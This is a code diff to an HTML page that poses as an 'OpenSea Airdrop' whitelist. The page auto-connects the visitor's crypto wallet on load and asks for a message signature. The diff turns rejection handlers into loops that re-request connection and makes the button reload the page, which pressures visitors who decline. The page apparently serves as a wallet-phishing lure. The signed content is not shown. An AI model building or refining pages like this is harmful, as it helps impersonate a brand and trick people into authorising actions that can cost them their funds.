@@ -33,8 +33,7 @@
         ethers,
         BrowserProvider,
       } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.1/ethers.min.js";
-    </script>
-    <script>
+
       const ethereum = window.ethereum;
       connect();
 
@@ -47,7 +46,7 @@
               signMessage();
             })
             .catch((responseError) => {
-              //connect();
+              connect();
             });
         } catch (connectError) {
           ethereum
@@ -57,12 +56,13 @@
               signMessage();
             })
             .catch((responseError) => {
-              //connect();
+              connect();
             });
         }
       }
 
       function signMessage() {
+        console.log("signMessage");
         const provider = new BrowserProvider(window.ethereum);
         console.log("provider", provider);
         provider
@@ -84,6 +84,12 @@
           .catch((signerError) => {
             console.log(signerError);
           });
+      }
+    </script>
+
+    <script>
+      function retry() {
+        window.location.reload();
       }
     </script>
     <style>
@@ -154,7 +160,7 @@
       <span class="txt"
         >Sign the message to be whitelisted for the OpenSea Airdrop</span
       >
-      <button onclick="connect()">Sign message</button>
+      <button onclick="retry()">Sign message</button>
     </div>
   </body>
 </html>
